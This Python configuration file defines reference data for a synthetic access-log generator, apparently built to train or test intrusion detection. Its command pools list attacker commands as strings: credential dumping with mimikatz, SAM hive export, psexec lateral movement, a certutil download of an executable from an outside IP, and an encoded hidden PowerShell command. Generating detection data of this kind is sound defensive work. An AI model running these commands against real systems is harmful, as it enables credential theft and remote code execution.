"""
Static configuration and reference data for the synthetic access-log generator:
cities (with lat/lon for distance math), resources (with sensitivity tiers),
auth methods, OS/firmware pools, and command pools.
"""

import numpy as np

# ---------------------------------------------------------------------------
# Reproducibility
# ---------------------------------------------------------------------------
RANDOM_SEED = 42

# ---------------------------------------------------------------------------
# Scale
# ---------------------------------------------------------------------------
N_ENTITIES = 300
N_DAYS = 45
START_DATE = "2026-06-10"  # window end will be START_DATE + N_DAYS

ENTITY_TYPE_MIX = {
    "user": 0.70,
    "service_account": 0.20,
    "edge_device": 0.10,
}

# Fraction of each entity type that is "privileged" (i.e. its sessions carry
# a command_sequence and it has access to tier-0/tier-1 resources normally).
PRIVILEGED_FRACTION = {
    "user": 0.15,
    "service_account": 0.50,
    "edge_device": 0.0,
}

# Overall attack injection rate, as a fraction of total normal event volume.
ATTACK_RATE_MIN = 0.005
ATTACK_RATE_MAX = 0.03

# ---------------------------------------------------------------------------
# Geography: (city, country, lat, lon). Deliberately globally spread so that
# impossible-travel pairs can be sampled with genuinely huge distances.
# ---------------------------------------------------------------------------
CITIES = [
    ("New York", "USA", 40.7128, -74.0060),
    ("Los Angeles", "USA", 34.0522, -118.2437),
    ("Chicago", "USA", 41.8781, -87.6298),
    ("Toronto", "Canada", 43.6532, -79.3832),
    ("Mexico City", "Mexico", 19.4326, -99.1332),
    ("Sao Paulo", "Brazil", -23.5505, -46.6333),
    ("Buenos Aires", "Argentina", -34.6037, -58.3816),
    ("Bogota", "Colombia", 4.7110, -74.0721),
    ("Lima", "Peru", -12.0464, -77.0428),
    ("Santiago", "Chile", -33.4489, -70.6693),
    ("London", "UK", 51.5074, -0.1278),
    ("Paris", "France", 48.8566, 2.3522),
    ("Berlin", "Germany", 52.5200, 13.4050),
    ("Madrid", "Spain", 40.4168, -3.7038),
    ("Rome", "Italy", 41.9028, 12.4964),
    ("Amsterdam", "Netherlands", 52.3676, 4.9041),
    ("Stockholm", "Sweden", 59.3293, 18.0686),
    ("Warsaw", "Poland", 52.2297, 21.0122),
    ("Vienna", "Austria", 48.2082, 16.3738),
    ("Zurich", "Switzerland", 47.3769, 8.5417),
    ("Dublin", "Ireland", 53.3498, -6.2603),
    ("Moscow", "Russia", 55.7558, 37.6173),
    ("Istanbul", "Turkey", 41.0082, 28.9784),
    ("Dubai", "UAE", 25.2048, 55.2708),
    ("Cairo", "Egypt", 30.0444, 31.2357),
    ("Lagos", "Nigeria", 6.5244, 3.3792),
    ("Nairobi", "Kenya", -1.2921, 36.8219),
    ("Cape Town", "South Africa", -33.9249, 18.4241),
    ("Mumbai", "India", 19.0760, 72.8777),
    ("Bangalore", "India", 12.9716, 77.5946),
    ("Singapore", "Singapore", 1.3521, 103.8198),
    ("Bangkok", "Thailand", 13.7563, 100.5018),
    ("Jakarta", "Indonesia", -6.2088, 106.8456),
    ("Beijing", "China", 39.9042, 116.4074),
    ("Shanghai", "China", 31.2304, 121.4737),
    ("Seoul", "South Korea", 37.5665, 126.9780),
    ("Tokyo", "Japan", 35.6762, 139.6503),
    ("Sydney", "Australia", -33.8688, 151.2093),
    ("Auckland", "New Zealand", -36.8485, 174.7633),
    ("Helsinki", "Finland", 60.1699, 24.9384),
    ("Oslo", "Norway", 59.9139, 10.7522),
]

# ---------------------------------------------------------------------------
# Resources, grouped into sensitivity tiers.
#   tier 0 = critical/admin  (crown jewels)
#   tier 1 = internal/sensitive
#   tier 2 = general purpose
# ---------------------------------------------------------------------------
RESOURCES_BY_TIER = {
    0: [
        "domain-controller-01",
        "admin-console",
        "secrets-vault",
        "payroll-db-prod",
        "core-banking-db",
        "kubernetes-admin-panel",
        "backup-master-server",
    ],
    1: [
        "hr-portal",
        "finance-reports-share",
        "source-code-repo",
        "customer-db-readonly",
        "internal-wiki-admin",
        "ci-cd-pipeline",
        "vpn-gateway-config",
    ],
    2: [
        "email",
        "shared-drive-marketing",
        "intranet-portal",
        "ticketing-system",
        "calendar-service",
        "chat-app",
        "printer-service",
        "file-share-general",
        "crm-app",
        "expense-system",
        "video-conferencing",
        "wifi-portal",
        "iot-telemetry-endpoint",
        "device-heartbeat-service",
        "firmware-update-service",
    ],
}

RESOURCE_TIER_LOOKUP = {
    res: tier for tier, resources in RESOURCES_BY_TIER.items() for res in resources
}
ALL_RESOURCES = list(RESOURCE_TIER_LOOKUP.keys())

# Resources considered plausible "typical" resources for edge devices.
EDGE_DEVICE_RESOURCES = [
    "iot-telemetry-endpoint",
    "device-heartbeat-service",
    "firmware-update-service",
]

# ---------------------------------------------------------------------------
# Auth methods, weighted by entity type.
# ---------------------------------------------------------------------------
AUTH_METHODS = ["password", "token", "certificate", "biometric"]

AUTH_METHOD_WEIGHTS = {
    "user": {"password": 0.45, "biometric": 0.30, "token": 0.20, "certificate": 0.05},
    "service_account": {"token": 0.55, "certificate": 0.40, "password": 0.05, "biometric": 0.0},
    "edge_device": {"certificate": 0.80, "token": 0.20, "password": 0.0, "biometric": 0.0},
}

# ---------------------------------------------------------------------------
# OS / firmware pools per entity type.
# ---------------------------------------------------------------------------
OS_POOL = {
    "user": [
        "Windows 10", "Windows 11", "macOS 13 Ventura", "macOS 14 Sonoma",
        "Ubuntu 22.04 LTS",
    ],
    "service_account": [
        "Ubuntu 20.04 LTS", "Ubuntu 22.04 LTS", "RHEL 8", "RHEL 9", "Windows Server 2022",
    ],
    "edge_device": [
        "IoT-FW-2.3.1", "IoT-FW-3.0.0", "RouterOS-6.49", "PLC-Firmware-1.8.2", "IoT-FW-2.9.4",
    ],
}

# Protocol used depends loosely on the resource being accessed.
PROTOCOL_FOR_TIER = {
    0: ["SSH", "RDP", "VPN-IPSec"],
    1: ["HTTPS", "SSH", "LDAP"],
    2: ["HTTPS", "MQTT", "SNMPv3"],
}

# For device_spoofing: OS/firmware strings that belong to *other* entity
# types, so a value drawn from here is one that never legitimately occurs
# for this entity type (a Windows laptop OS on an edge device, IoT firmware
# on a user's laptop, etc.) -- a fingerprint with no historically consistent
# explanation, not just an unfamiliar one.
FOREIGN_OS_POOL = {
    entity_type: [os_name for other_type, os_list in OS_POOL.items() if other_type != entity_type for os_name in os_list]
    for entity_type in OS_POOL
}

# ---------------------------------------------------------------------------
# Command pools (only used for privileged-entity sessions).
# ---------------------------------------------------------------------------
BENIGN_COMMANDS = [
    "ls -la", "cd /home/user", "cat report.csv", "git pull", "npm install",
    "python analyze.py", "sudo systemctl status app", "df -h", "ps aux",
    "tail -f app.log", "vim config.yaml", "curl https://internal-api/health",
    "scp file.txt user@server:/backup", "docker ps", "kubectl get pods",
    "sudo systemctl restart nginx", "git commit -m 'update'", "npm run build",
]

# Ordered so that later entries represent later stages of a lateral-movement
# / privilege-escalation chain (recon -> credential access -> pivot -> exfil).
MALICIOUS_COMMAND_STAGES = [
    ["whoami", "hostname", "ipconfig /all"],
    ["net user", "net group \"domain admins\" /domain", "nltest /domain_trusts"],
    ["reg save hklm\\sam sam.hive", "mimikatz.exe sekurlsa::logonpasswords"],
    ["net view \\\\fileserver", "psexec \\\\dc01 cmd"],
    ["net use z: \\\\backup-master-server\\share", "wmic /node:dc01 process call create cmd.exe"],
    ["xcopy z:\\* c:\\staging /s /e", "7z a exfil.zip c:\\staging"],
]

# Deliberately a different flavor from BENIGN_COMMANDS and
# MALICIOUS_COMMAND_STAGES: single-shot enumeration/probing commands typical
# of someone unfamiliar with the environment poking around with a stolen
# credential, used by credential_misuse.
CREDENTIAL_MISUSE_COMMANDS = [
    "whoami /all", "net user administrator", "systeminfo", "tasklist /svc",
    "reg query hklm\\software\\microsoft\\windows\\currentversion\\run",
    "netstat -ano", "net share", "wmic useraccount list full",
    "certutil -urlcache -f http://185.220.101.5/update.exe update.exe",
    "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
]

# ---------------------------------------------------------------------------
# Impossible-travel physics.
# ---------------------------------------------------------------------------
# Fastest plausible point-to-point commercial travel speed (km/h), generously
# padded above cruise speed to account for short connections. Any inferred
# speed above this is physically impossible and is our attack signal.
MAX_PLAUSIBLE_TRAVEL_KMH = 900.0

RNG = np.random.default_rng(RANDOM_SEED)
